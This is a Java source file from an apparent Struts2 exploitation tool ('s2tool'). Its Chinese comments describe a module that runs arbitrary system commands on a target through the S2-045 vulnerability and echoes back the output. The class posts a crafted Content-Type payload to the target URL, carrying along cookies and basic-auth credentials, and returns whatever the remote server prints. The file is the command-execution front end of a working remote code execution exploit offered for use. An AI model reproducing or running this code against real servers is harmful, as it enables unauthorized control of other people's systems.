package com.s2tool.modules;

import com.s2tool.core.HttpClient;
import com.s2tool.core.HttpResponseData;
import com.s2tool.core.PayloadBuilder;
import com.s2tool.core.Target;

/**
 * 命令执行模块：基于 S2-045 的 ProcessBuilder 命令执行 + 回显。
 *
 * <p>每次命令执行发送独立 HTTP 请求，响应体即为命令执行结果
 * （stderr 已通过 redirectErrorStream(true) 合并到 stdout）。</p>
 */
public class Executor {

    private final HttpClient http;
    private final Target target;

    public Executor(HttpClient http, Target target) {
        this.http = http;
        this.target = target;
    }

    /**
     * 执行单条命令并返回结果。
     *
     * @param command 系统命令
     * @return 命令执行结果
     */
    public ExecResult exec(String command) {
        return exec(command, 30000);
    }

    /**
     * 执行单条命令（带超时）。
     */
    public ExecResult exec(String command, int timeoutMs) {
        if (command == null || command.trim().isEmpty()) {
            return ExecResult.fail("命令不能为空");
        }
        String contentType = PayloadBuilder.commandPayload(command);
        long start = System.currentTimeMillis();
        HttpResponseData resp = http.post(target.getFullUrl(), contentType,
                target.getCookie(), target.getBasicAuthUser(), target.getBasicAuthPass(),
                null, null);
        long elapsed = System.currentTimeMillis() - start;

        if (resp.getError() != null) {
            return ExecResult.fail("请求异常: " + resp.getError().getMessage());
        }
        if (resp.getStatusCode() == 0) {
            return ExecResult.fail("目标不可达，请检查 URL 和网络");
        }

        String body = resp.getBody();
        if (body == null || body.trim().isEmpty()) {
            return ExecResult.ok("命令执行成功但无输出（常见于 mkdir 等无输出命令）", elapsed);
        }
        return ExecResult.ok(body, elapsed);
    }

    /** 命令执行结果 */
    public static class ExecResult {
        private final boolean success;
        private final String output;
        private final long elapsedMs;

        private ExecResult(boolean success, String output, long elapsedMs) {
            this.success = success;
            this.output = output;
            this.elapsedMs = elapsedMs;
        }

        public static ExecResult ok(String output, long elapsedMs) {
            return new ExecResult(true, output, elapsedMs);
        }

        public static ExecResult fail(String msg) {
            return new ExecResult(false, msg, 0);
        }

        public boolean isSuccess() { return success; }
        public String getOutput() { return output; }
        public long getElapsedMs() { return elapsedMs; }
    }
}
